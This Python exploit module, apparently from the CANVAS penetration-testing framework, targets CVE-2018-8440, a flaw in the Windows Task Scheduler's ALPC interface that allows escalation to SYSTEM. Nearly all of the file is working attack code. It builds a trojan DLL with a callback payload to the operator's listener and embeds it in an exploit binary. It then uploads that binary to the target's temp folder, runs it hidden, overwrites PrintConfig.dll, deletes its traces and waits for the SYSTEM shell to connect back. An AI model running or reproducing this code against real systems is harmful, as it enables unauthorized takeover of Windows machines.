#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  alpc_tasksched_lpe.py
## Description:  An elevation of privilege vulnerability exists when Windows
##               improperly handles calls to Advanced Local Procedure Call (ALPC)
## Created_On :  Mon Dec 12 2018
## Created_By :
##
## (c) Copyright 2019, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import time
import struct
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

import canvasengine

from exploitutils import *
from libs.canvasos import canvasos
from shellcode.standalone.windows.payloads64 import payloads as payloads64
from MOSDEF.pelib import PElib
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit


NAME                            = "ALPC Tasksched LPE"
DESCRIPTION                     = "Write arbitrary DACLs to '.job' using the ALPC endpoint method SchRpcSetSecurity implemented by the task scheduler service. Finally allows arbitrary code execution as SYSTEM"

DOCUMENTATION                   = {}
DOCUMENTATION["VENDOR"]         = "Microsoft"
DOCUMENTATION["CVE Name"]       = "CVE-2018-8440"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8440"
DOCUMENTATION["CVSS"]           = 7.8
DOCUMENTATION["Notes"]          = """
WARNING: The PrintConfig.dll on the target host will be overwritten when the exploit runs.

Tested:

Windows 10 1703 x64
Windows 10 1803 x86
"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Local'
PROPERTY['ARCH']                = [["Windows", "x64"], ["Windows", "x86"]]
PROPERTY['VERSION']             = ['10']
PROPERTY['MS PATCHES']          = ['KB4457138', 'KB4457142', 'KB4457128', 'KB4456655']


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.node                   = None

        self.name                   = NAME
        self.local_path             = os.path.dirname(__file__)
        self.binaries_path          = os.path.join(self.local_path, "Resources")

        self.use_local_interface    = False
        self.autoFind               = False

        self.win10_version_supported = []

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def detect_releaseid(self):
        from WindowsConstants import KEY_QUERY_VALUE
        from WindowsConstants import HKEY_LOCAL_MACHINE
        from WindowsConstants import GENERIC_WRITE

        RELEASEID_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        hKey = self.node.shell.get_reg_key_handle(HKEY_LOCAL_MACHINE, RELEASEID_KEY, KEY_QUERY_VALUE)

        releaseid = int(self.node.shell.RegQueryValueEx(hKey, "ReleaseID")[2].strip('\0'))

        return releaseid

    def make_dll(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        if t_os.arch == "x64":
            plds = payloads64(dll=True)

            inner_pld = payloads64(module=self, dll=False)
            assembly_inner = inner_pld.callback(self.callback.ip, self.callback.port, universal=True)
            code_inner = inner_pld.assemble(assembly_inner)

            assembly_outer = plds.wrap_payload(code_inner)
            shellcode = plds.assemble(assembly_outer)

            myPElib = PElib(win64=1)
            trojan_dll = myPElib.createPEFileBuf({'DllMain' : shellcode}, gui=False)
        else:
            trojan_dll = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                                target_os=t_os, universal=True,
                                                encrypted=False,
                                                dll=True, win8_compatible=True)

            trojan_dll = self.mosdeftrojan

        return trojan_dll

    def write_files_remote(self):
        paths = {}

        tmp_path = self.node.shell.GetTempPathA()
        if not tmp_path:
            logging.error("Could not resolve full temp directory path")
            return None
        else:
            logging.info("Temp directory: %s" % tmp_path)

        if self.node.shell.chdir(tmp_path) < 0:
            logging.error("Could not chdir into %s" % tmp_path)

        remote_exploit_name = "%s.exe" % random.randint(10001, 99999)
        remote_exploit_path = tmp_path + remote_exploit_name
        local_tmp_exploit_path = os.path.join(self.binaries_path, remote_exploit_name)

        paths['local_tmp_exploit_path'] = local_tmp_exploit_path
        paths['remote_exploit_name'] = remote_exploit_name
        paths['remote_exploit_path'] = remote_exploit_path

        trojan_dll = self.make_dll()

        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        xpl_orig_name = "exploit_x86.exe"
        if t_os.arch == "x64":
            xpl_orig_name = "exploit_x64.exe"

        local_exploit_path = os.path.join(self.binaries_path, xpl_orig_name)

        with open(local_exploit_path, "rb") as f:
            xpl_binary = f.read()

        len_trojan_dll = len(trojan_dll)

        if (len_trojan_dll > 20000):
            logging.error("The trojan size is greater than the exploit buffer")
            return None

        pos = xpl_binary.find('NOX') + 4
        xpl_binary.replace("NOX\0", struct.pack('<L', len_trojan_dll))

        tmp_xpl = xpl_binary[:pos]
        tmp_xpl += trojan_dll
        tmp_xpl += xpl_binary[pos+len_trojan_dll:]

        with open(local_tmp_exploit_path, "wb") as f:
            f.write(tmp_xpl)

        if not self.nodeUpload(local_tmp_exploit_path, remote_exploit_path):
            logging.error("Error while uploading exploit binary")
            return None

        return paths

    def spawn_process(self, path):
        logging.info("Spawning exploit: %s" % path)

        try:
            cmd_line = path
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 0,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            self.log_error("%s" % ex)
            return False

        return ret

    def run(self):
        module_succeeded = []
        ret = 0
        for node in self.argsDict["passednodes"]:
            self.node = node

            if not self.is_windows_node():
                module_succeeded.append(False)
                continue

            if not any([self.is_win10_node(),
                        self.is_win2016_node()]):
                logging.warning("Not Windows 10/2016")
                continue

            releaseid = self.detect_releaseid()
            logging.info("Windows 10 %d" % releaseid)

            win10 = [1703, 1709, 1803]
            if not int(releaseid) in win10:
                logging.warning("Windows 10 version detected is not vulnerable")
                return False

            paths = self.write_files_remote()

            if paths == None:
                logging.error("Failed to upload the executables")
                return False

            if not self.spawn_process(paths['remote_exploit_path']):
                logging.error("Could not spawn %s" % NAME)
                return False

            os.unlink(paths['local_tmp_exploit_path'])

            time.sleep(15)

            self.node.shell.unlink(paths['remote_exploit_path'])

            logging.info("Waiting for the callback connection ...")
            logging.info("Waiting for 1 second")

            for i in range(30):
                if self.ISucceeded():
                    ret = 1
                    self.summary[node] = 1
                    break
                time.sleep(1)
                logging.info("Waiting for %d seconds" % (i+2))

        return ret

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPION, VERSION))
    app = theexploit()
    ret = standar_callback_commandline(app)
